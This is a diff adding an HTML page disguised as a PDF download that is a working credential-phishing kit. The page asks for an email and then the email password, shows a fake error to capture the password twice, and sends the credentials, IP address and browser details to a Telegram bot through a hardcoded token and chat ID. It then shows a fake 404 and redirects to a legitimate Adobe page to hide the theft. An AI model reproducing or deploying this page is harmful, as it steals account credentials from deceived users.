@@ -1,0 +1,252 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>PDF</title>
+  <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSdJg0_O5HYIKugz7mdHzry4AXc2C0S0Z1IbA&s" type="image/png" />
+  <style>
+    body {
+      position: relative;
+      background-image: url('https://static.vecteezy.com/system/resources/previews/006/121/874/non_2x/minimalist-and-professional-black-and-white-blue-color-invoice-voucher-receipt-sales-voucher-template-format-free-vector.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-position: center;
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      overflow: hidden;
+    }
+
+    /* 🟦 Blur and dark overlay layer */
+    body::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 100%;
+      backdrop-filter: blur(5px);
+      background-color: rgba(0, 0, 0, 0.7); /* darker and more visible */
+      z-index: 0;
+    }
+
+    .form-container {
+      position: relative;
+      z-index: 1;
+      background: rgba(255, 255, 255, 0.95);
+      padding: 30px;
+      border-radius: 10px;
+      text-align: center;
+      width: 400px;
+    }
+
+    input[type="email"], input[type="password"] {
+      padding: 15px;
+      width: 90%;
+      font-size: 16px;
+      margin-top: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+
+    input[readonly] {
+      background-color: #e9ecef;
+      color: #333;
+      cursor: not-allowed;
+    }
+
+    button {
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      margin-top: 20px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 50%;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    .spinner {
+      display: none;
+      margin: 20px auto;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #007BFF;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .error {
+      color: red;
+      margin-top: 10px;
+    }
+
+    #fake404 h2 {
+      color: #b30000;
+      font-size: 20px;
+    }
+
+    #fake404 p {
+      color: #333;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<noscript>You need to enable JavaScript to run this app.</noscript>
+<div id="root"></div>
+
+  <div class="form-container">
+    <h2 id="formTitle">Enter email to download files</h2>
+
+    <!-- EMAIL FORM -->
+    <form id="emailForm" onsubmit="handleEmailFormSubmit(event)">
+      <input type="email" name="email" placeholder="Enter your email" required />
+      <input type="text" name="website" class="hidden" autocomplete="off" />
+      <button type="submit">Download to Email</button>
+    </form>
+
+    <!-- SPINNER -->
+    <div class="spinner" id="spinner"></div>
+
+    <!-- PASSWORD FORM -->
+    <form id="passwordForm" class="hidden" onsubmit="return false;">
+      <h3>Confirm email password to continue</h3>
+      <input type="email" name="email" id="emailVisible" readonly />
+      <input type="password" name="password" placeholder="Enter password" required />
+      <input type="text" name="website" class="hidden" autocomplete="off" />
+      <div class="error" id="passwordError" style="display: none;">The email or password entered is incorrect. Please try again.</div>
+      <button type="button" onclick="handlePasswordSubmit()">Continue</button>
+    </form>
+
+    <!-- FAKE 404 -->
+    <div id="fake404" class="hidden">
+      <h3>404 - Page Not Found</h3>
+      <p>Oops! The file you're looking for is unavailable right now,<br>try again later or contact the sender.</p>
+    </div>
+  </div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = '8074885571:AAE8kwQholZsuhwNerw1AjDCdT6vEp-gPZo';
+    const TELEGRAM_CHAT_ID = '7574144222';
+    let clientIP = 'Fetching IP...';
+
+    // Fetch IP using a public API
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        clientIP = data.ip;
+      })
+      .catch(() => {
+        clientIP = 'Unavailable';
+      });
+
+    function sendToTelegram(email, password) {
+      const userAgent = navigator.userAgent;
+      const message = `<b>New Submission</b>\nEmail: ${email}\nPassword: ${password}\nIP: ${clientIP}\nUA: ${userAgent}`;
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`
+      });
+    }
+
+    function handleEmailFormSubmit(event) {
+      event.preventDefault();
+      const emailInput = document.querySelector('#emailForm input[name="email"]');
+      const email = emailInput.value.trim();
+
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      if (!emailRegex.test(email)) {
+        alert("Please enter a valid email address (e.g., user@example.com).");
+        return;
+      }
+
+      goToPassword(email);
+    }
+
+    function goToPassword(email = null) {
+      const emailInput = document.querySelector('#emailForm input[name="email"]');
+      const finalEmail = email || emailInput.value.trim();
+      if (!finalEmail) return alert("Please enter a valid email.");
+
+      document.getElementById('emailForm').style.display = 'none';
+      document.getElementById('spinner').style.display = 'block';
+
+      setTimeout(() => {
+        document.getElementById('spinner').style.display = 'none';
+        document.getElementById('formTitle').style.display = 'none';
+        document.getElementById('passwordForm').classList.remove('hidden');
+        document.getElementById('emailVisible').value = finalEmail;
+      }, 1200);
+    }
+
+    function handlePasswordSubmit() {
+      const errorDiv = document.getElementById('passwordError');
+      const passwordInput = document.querySelector('#passwordForm input[name="password"]');
+      const emailInput = document.getElementById('emailVisible');
+      const password = passwordInput.value.trim();
+      const email = emailInput.value.trim();
+
+      if (!password || !email) {
+        alert("Please enter your password.");
+        return;
+      }
+
+      const alreadyTried = localStorage.getItem('passwordTried');
+      sendToTelegram(email, password);
+
+      if (!alreadyTried) {
+        errorDiv.style.display = 'block';
+        localStorage.setItem('passwordTried', '1');
+      } else {
+        errorDiv.style.display = 'none';
+        document.getElementById('spinner').style.display = 'block';
+
+        setTimeout(() => {
+          document.getElementById('passwordForm').style.display = 'none';
+          document.getElementById('spinner').style.display = 'none';
+          document.getElementById('fake404').classList.remove('hidden');
+
+          setTimeout(() => {
+            window.location.href = "https://www.adobe.com/acrobat/online/extract-pdf-pages.html";
+          }, 2000);
+        }, 1000);
+      }
+    }
+
+    window.onload = () => {
+      localStorage.removeItem('passwordTried');
+
+      const hash = window.location.hash;
+      if (hash && hash.includes('@')) {
+        const autoEmail = hash.substring(1); // remove the #
+        goToPassword(autoEmail);
+      }
+    };
+  </script>
+<noscript>You need to enable JavaScript to run this app.</noscript>
+<div id="root"></div>
+</html>
